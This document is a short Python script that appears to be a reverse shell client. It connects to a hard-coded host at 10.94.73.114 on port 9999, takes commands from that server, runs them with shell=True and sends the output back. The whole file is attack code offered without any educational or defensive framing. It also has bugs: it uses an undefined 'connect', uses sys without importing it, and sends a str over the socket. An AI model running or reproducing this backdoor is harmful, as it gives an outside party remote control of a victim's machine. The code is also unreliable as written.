import os
import socket
import subprocess

# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '10.94.73.114'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        connect.close()
        s.close()
        sys.exit()

# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        connect.close()
        s.close()
        sys.exit()

# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            output_str = " "
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            s.send(output_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
